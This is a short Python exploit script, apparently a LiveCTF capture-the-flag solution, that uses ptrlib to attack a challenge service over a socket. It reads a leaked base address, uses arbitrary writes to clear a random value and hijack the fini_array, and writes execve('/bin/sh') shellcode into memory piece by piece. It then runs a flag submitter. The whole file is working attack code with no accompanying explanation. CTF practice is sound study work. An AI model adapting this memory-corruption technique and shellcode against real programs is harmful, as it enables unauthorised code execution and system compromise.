from ptrlib import *

HOST = os.getenv('HOST', 'localhost')
PORT = 31337 # os.getenv('PORT', 31337)

# stream = Process("./challenge", cwd="handout")
stream = Socket(HOST, PORT)
sock = stream

base_addr = u64(stream.recvonce(8))

print(hex(base_addr))

# overwrite random value
stream.send(p64(base_addr+0x45C4))
stream.send(p64(0))

# fini_array
stream.send(p64(base_addr+0x4338))
stream.send(p64(base_addr+0x2000))

stream.send(p64(base_addr+0x4340-0x10))
stream.send(p64(base_addr + 0x1370))

stream.send(p64(0))
# Correct!
stream.send(p32(0))

stream.send(p64(base_addr+0x2110))
stream.send(b'\x48\x31\xc0\x50\x5e\x50\x5a\x50')
stream.send(p64(base_addr+0x2110+8*1))
stream.send(b'\x48\xbf\x2f\x2f\x62\x69\x6e\x2f')
stream.send(p64(base_addr+0x2110+8*2))
stream.send(b'\x73\x68\x48\xc1\xef\x08\x57\x54')
stream.send(p64(base_addr+0x2110+8*3))
stream.send(b'\x5f\xb0\x3b\x0f\x05'.ljust(8, b'\x90'))

stream.send(p64(base_addr+0x4340))

from time import sleep
sleep(1)
stream.send(b'/home/livectf/submitter\n')

for i in range(100):
    try:
        print(stream.recvline(timeout=1))
    except TimeoutError:
        break

stream.close()
